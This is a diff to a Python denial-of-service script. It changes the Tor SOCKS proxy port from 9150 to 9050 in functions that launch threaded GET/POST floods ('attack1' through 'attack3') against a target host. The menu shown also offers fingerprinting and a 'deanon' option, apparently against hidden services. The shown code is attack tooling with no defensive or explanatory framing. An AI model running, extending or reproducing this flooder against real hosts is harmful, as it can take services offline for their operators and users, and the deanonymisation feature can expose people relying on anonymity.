@@ -66,7 +66,7 @@ randstr = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.d
 def attack1(host, port):
     foo = ['GET', 'POST']
     http = random.choice(foo)
-    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150, True)
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
     s = socks.socksocket()
     try:
       s.connect((host, 80))
@@ -296,7 +296,7 @@ elif(attack == '8'):
   for x in head: print(Fore.GREEN + x)
   exit()
 elif(attack == '9'):
-  fingerprint(target1, 9150)
+  fingerprint(target1, 9050)
   exit()
 elif(attack == '10'):
   deanon()
@@ -307,9 +307,9 @@ print(Fore.WHITE + '  Start DoS')
 
 threads = []
 for n in range(int(thread)):
-    t1 = threading.Thread(target=attack1, args=(target1, 9150))
-    t2 = threading.Thread(target=attack2, args=(target, 9150))
-    t3 = threading.Thread(target=attack3, args=(target, 9150))
+    t1 = threading.Thread(target=attack1, args=(target1, 9050))
+    t2 = threading.Thread(target=attack2, args=(target, 9050))
+    t3 = threading.Thread(target=attack3, args=(target1, 9050))
 
 
     t1.daemon = True
